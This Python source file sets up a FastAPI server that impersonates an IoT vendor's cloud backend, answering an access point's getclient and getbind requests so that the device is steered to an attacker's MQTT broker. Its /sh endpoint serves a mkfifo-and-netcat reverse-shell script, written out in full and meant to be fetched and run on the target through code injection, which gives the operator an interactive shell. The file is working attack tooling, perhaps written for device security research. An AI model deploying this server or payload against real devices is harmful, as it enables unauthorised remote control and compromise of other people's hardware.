"""
Webserver:
    - returns response to the endpoints /cloudnetlot/backend/{getclient, getbind}
    - hosts a script to launch reverse shell (script is donwload from target using code injection)
"""

import configparser
import datetime

import uvicorn
from fastapi import FastAPI, Response
from pydantic import BaseModel

config = configparser.ConfigParser()
config.read("configuration.ini")

# to receive shell from the AP
REVERSE_SHELL_IP = config["REVERSE_SHELL"].get("IP", "192.168.188.180")
REVERSE_SHELL_PORT = config["REVERSE_SHELL"].getint("PORT", 7891)

WEB_SERVER_IP = config["WEB_SERVER"].get("IP", "0.0.0.0")
WEB_SERVER_PORT = config["WEB_SERVER"].getint("PORT", 8080)

MQTT_BROKER_IP = config["MQTT_BROKER"].get("IP", "192.168.188.180")
MQTT_BROKER_PORT = config["MQTT_BROKER"].get("PORT", "1883")


app = FastAPI(debug=True)


class Client(BaseModel):
    """Model for the request payload in /cloudnetlot/backend/getclient"""

    appid: str
    secret: str
    prtid: str
    mac: str
    type: str


class Mac(BaseModel):
    """Model for the request payload in /cloudnetlot/backend/getbind"""

    mac: str


class ClientData(BaseModel):
    """Model for the response payload to /cloudnetlot/backend/getclient (field data)"""

    protocol: str = "v1.0"
    prtid: str
    cltid: str = "somecltid"
    server_protocol: str = "mqtt"
    server: str = MQTT_BROKER_IP  # MQTT broker IP
    port: str = MQTT_BROKER_PORT  # MQTT broker port
    encode: dict[str, str] = {"type": "1"}
    now: str = ""


class BindData(BaseModel):
    """Model for the response payload to /cloudnetlot/backend/getbind (field data)"""

    bind: str = "thisIsABindCode"


class Server(BaseModel):
    """Model for the response payload to /cloudnetlot/backend/{getclient, getbind}"""

    status: int = 10000
    data: ClientData | BindData
    errorCode: list[str] = []


@app.get("/sh")
async def get_shell() -> Response:
    """Serve a script to be executed using a remote code execution.
    This method allows to circumvent the size limit

    Returns:
        Response: shell script
    """
    script = (
        "#!/bin/sh\nrm /tmp/f;"
        + "mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1"
        + f"|nc {REVERSE_SHELL_IP} {REVERSE_SHELL_PORT} > /tmp/f"
    )
    return Response(content=script)


@app.post("/cloudnetlot/backend/getclient")
async def get_client(client: Client) -> Server:
    """Fake endpoint /cloudnetlot/backend/getclient

    Args:
        client (Client): json request by the AP

    Returns:
        Server: fake response containing the address of our MQTT broker
    """
    print(client)
    now = int(datetime.datetime.now().timestamp())
    data = ClientData(prtid=client.prtid, now=str(now))

    return Server(data=data)


@app.post("/cloudnetlot/backend/getbind")
async def get_bind(mac: Mac) -> Server:
    """Fake endpoint /cloudnetlot/backend/getbind

    Args:
        mac (Mac): json request by the ap

    Returns:
        Server: fake response containing a random bind code
    """
    print(mac)
    return Server(data=BindData())


if __name__ == "__main__":
    uvicorn.run(app, host=WEB_SERVER_IP, port=WEB_SERVER_PORT)
